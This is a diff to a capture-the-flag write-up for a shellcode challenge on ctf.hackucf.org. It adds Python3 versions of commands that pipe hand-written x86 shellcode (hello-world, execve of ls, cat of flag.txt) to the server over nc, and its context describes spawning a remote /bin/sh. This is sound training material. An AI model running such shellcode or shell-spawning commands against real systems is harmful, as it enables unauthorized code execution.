@@ -16,8 +16,10 @@ The final shellcode performs `cat` on the file `flag.txt` on the server. You can
 Or you can get a shell on the server by looking at my `/bin/ls` example and changing the `ls` to `sh`.  
 If you want the quickest route to the flag, you can find existing shellcode solutions on-line and just use them. I tested one from http://shell-storm.org/shellcode/ (I tried Linux/x86 - execve(/bin/bash. [/bin/sh, -p]NULL) - 33 bytes and it worked well).  
 **Warning**: Malwarebytes doesn't like the above site, but I think it's ok - lots of h4x0r's use it, but take care.  
-**Note:** If you use `/bin/sh` against a server, you need to force the server to wait after executing your command, or it will return without you being able to use the shell. To do this, your command line should be:  
-`(python -c "print('<your shellcode here>')" ; cat) | nc ctf.hackucf.org 10103`
+**Note:** If you use `/bin/sh` against a server, you need to force the server to wait after executing your command, or it will return without you being able to use the shell. To do this, your command line should be (for Python2):  
+`(python -c "print('<your shellcode here>')" ; cat) | nc ctf.hackucf.org 10103`  
+or, for Python3:  
+`(python3 -c "import sys; sys.stdout.buffer.write(b'<your shellcode here>')" ; cat) | nc ctf.hackucf.org 10103`
 
 This challenge requires some shellcode to solve. Running it on the server returns:
 ```
@@ -325,6 +327,8 @@ Running shellcode!
 Hello, world!
 ```
 Yes, we can!
+> **Note:** The above works in Python2. As Python3 uses Unicode for the basic string, and `print()` expects Unicode, for Python3 use:  
+  `python3 -c "import sys; sys.stdout.buffer.write(b'\xeb\x15\x59\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xd2\xb2\x0e\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe6\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21\x0a')" | nc ctf.hackucf.org 10103`
 
 Now, let's convert this to an `ls` on the server using `execve()` as we started earlier.
 For 32-bit `execve()`, the set up is:
@@ -345,6 +349,10 @@ This has only 7 bytes, and we need 4 per `push` (the total length of output from
 > python -c "print('/bin//ls'.encode('hex'))"
 2f62696e2f2f6c73
 ```
+> **Note:** The above commands work in Python2. To get the hex values in Python3, use:  
+  `python3 -c "import binascii; print(binascii.b2a_hex(b'/bin//ls'))"`
+
+
 So we need to push to the stack `0x6e69622f` and `0x736c2f2f`. Whatever is pushed last will be popped first, so we also need to reverse these so that `0x736c2f2f` is pushed first.
 
 Now the assembly language becomes:
@@ -407,7 +415,9 @@ Running shellcode!
 flag.txt
 gimmeshellcode
 ```
-Great! We can see that there's a file named `flag.txt` there. 
+Great! We can see that there's a file named `flag.txt` there.
+> **Note:** The above works in Python2. As Python3 uses Unicode for the basic string, and `print()` expects Unicode, for Python3 use:  
+  `python3 -c "import sys; sys.stdout.buffer.write(b'\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\xb0\x01\x31\xdb\xcd\x80')" | nc ctf.hackucf.org 10103`
 
 Let's write one more shellcode example to `cat` that file (it'll give us the chance to test `execve()` with multiple arguments in `argv`).
 
@@ -419,6 +429,8 @@ First we need bytes for the strings `/bin/cat` and `flag.txt`
 666c61672e747874
 ```
 Both are the right length, so we don't need padding. `/bin/cat` will need `0x6e69622f` and `0x7461632f`, and `flag.txt` will need `0x67616c66` and `0x7478742e`.
+> **Note:** The above commands work in Python2. To get the hex values in Python3, use:  
+  `python3 -c "import binascii; print(binascii.b2a_hex(b'/bin/cat'))"`
 
 Here's the assembly I wrote to do the `cat`:
 ```asm
@@ -474,4 +486,7 @@ Send me shellcode, and I'll run it for you!
 Running shellcode!
 flag{...}
 ```
+> **Note:** The above works in Python2. As Python3 uses Unicode for the basic string, and `print()` expects Unicode, for Python3 change the above `python` command to:  
+`python3 -c "import sys; sys.stdout.buffer.write(b'$SCODE')" | nc ctf.hackucf.org 10103`
+
 This gave me the flag.
